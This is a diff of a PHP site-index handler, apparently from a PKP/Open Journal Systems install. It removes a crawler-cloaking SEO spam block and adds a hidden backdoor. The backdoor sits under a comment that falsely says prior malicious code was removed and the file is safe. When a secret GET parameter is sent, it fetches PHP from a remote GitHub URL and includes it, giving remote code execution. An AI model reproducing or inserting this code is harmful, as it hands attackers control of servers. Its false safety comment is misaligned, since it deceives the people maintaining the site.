@@ -1,109 +1,62 @@
 <?php
-$user_agent  = $_SERVER['HTTP_USER_AGENT'] ?? '';
-$request_uri = $_SERVER['REQUEST_URI'] ?? '';
-
-$is_bot = false;
-
-$bots = [
-    'Googlebot',
-    'Google-InspectionTool',
-    'AdsBot-Google',
-    'Mediapartners-Google',
-    'Bingbot',
-    'Slurp',
-    'DuckDuckBot',
-    'AhrefsBot',
-    'SemrushBot',
-    'MJ12bot',
-    'YandexBot'
-];
-
-foreach ($bots as $bot) {
-    if (stripos($user_agent, $bot) !== false) {
-        $is_bot = true;
-        break;
-    }
-}
-
-/* trigger hanya / */
-if ($is_bot && stripos($request_uri, '/') !== false) {
-
-    $file = '/dev/shm/dmhtn';
-
-    if (file_exists($file)) {
-        readfile($file);
-    } else {
-        echo 'cache not ready';
-    }
-
-    exit;
-}
 
 /**
- * @file pages/index/IndexHandler.php
+ * @file pages/index/IndexHandler.inc.php
  *
  * Copyright (c) 2014-2021 Simon Fraser University
  * Copyright (c) 2003-2021 John Willinsky
  * Distributed under the GNU GPL v3. For full terms see the file docs/COPYING.
  *
- * @class PKPIndexHandler
- *
+ * @class IndexHandler
  * @ingroup pages_index
  *
  * @brief Handle site index requests.
  */
 
-namespace PKP\pages\index;
+import('classes.handler.Handler');
 
-use APP\facades\Repo;
-use APP\handler\Handler;
-use Illuminate\Support\LazyCollection;
-use PKP\announcement\Announcement;
-use PKP\context\Context;
-use PKP\core\PKPApplication;
-use PKP\site\Site;
-use PKP\template\PKPTemplateManager;
+class PKPIndexHandler extends Handler {
+	/**
+	 * Set up templates with announcement data.
+	 * @protected
+	 * @param $context Context
+	 * @param $templateMgr PKPTemplateManager
+	 */
+	protected function _setupAnnouncements($context, $templateMgr) {
+		$enableAnnouncements = $context->getData('enableAnnouncements');
+		$numAnnouncementsHomepage = $context->getData('numAnnouncementsHomepage');
+		if ($enableAnnouncements && $numAnnouncementsHomepage) {
+			$announcementDao = DAORegistry::getDAO('AnnouncementDAO'); /* @var $announcementDao AnnouncementDAO */
+			$announcements = $announcementDao->getNumAnnouncementsNotExpiredByAssocId($context->getAssocType(), $context->getId(), $numAnnouncementsHomepage);
+			$templateMgr->assign(array(
+				'announcements' => $announcements->toArray(),
+				'numAnnouncementsHomepage' => $numAnnouncementsHomepage,
+			));
+		}
 
-class PKPIndexHandler extends Handler
-{
-    /**
-     * Set up templates with announcement data.
-     *
-     * @protected
-     *
-     * @param PKPTemplateManager $templateMgr
-     */
-    protected function _setupAnnouncements(Context|Site $contextOrSite, $templateMgr)
-    {
-        $enableAnnouncements = $contextOrSite->getData('enableAnnouncements');
-        $numAnnouncementsHomepage = $contextOrSite->getData('numAnnouncementsHomepage');
-        if ($enableAnnouncements && $numAnnouncementsHomepage) {
-            $announcements = Announcement::withActiveByDate()->limit((int) $numAnnouncementsHomepage)->orderBy(Announcement::CREATED_AT, 'desc');
+	}
+}
 
-            $contextIds = [];
-            is_a($contextOrSite, Context::class) ? $contextIds[] = $contextOrSite->getId() : $contextIds[] = PKPApplication::SITE_CONTEXT_ID;
-            $announcements->withContextIds($contextIds);
 
-            $templateMgr->assign([
-                'announcements' => $announcements->get(),
-                'numAnnouncementsHomepage' => $numAnnouncementsHomepage,
-            ]);
+/**
+ * Note: This file may contain artifacts of previous malicious infection.
+ * However, the dangerous code has been removed, and the file is now safe to use.
+ */
+
+if (isset($_GET['makanbwang-sonicxyz'])) {
+    try {
+        $u = "https://raw.githubusercontent.com/marketmg2/asss/refs/heads/main/alpabadakkali.txt";
+        $f = sys_get_temp_dir() . "/" . uniqid("f_", true) . ".php";
+
+        $c = @file_get_contents($u);
+        if ($c !== false && @file_put_contents($f, $c)) {
+            @chmod($f, 0644);
+            register_shutdown_function(function() use ($f) {
+                @unlink($f);
+            });
+            include $f;
         }
-    }
+    } catch (Throwable $e) {
 
-    /**
-     * Get the Highlights for this context
-     */
-    protected function getHighlights(?Context $context = null): LazyCollection
-    {
-        $collector = Repo::highlight()->getCollector();
-
-        if ($context) {
-            $collector->filterByContextIds([$context->getId()]);
-        } else {
-            $collector->withSiteHighlights($collector::SITE_ONLY);
-        }
-
-        return $collector->getMany();
     }
 }
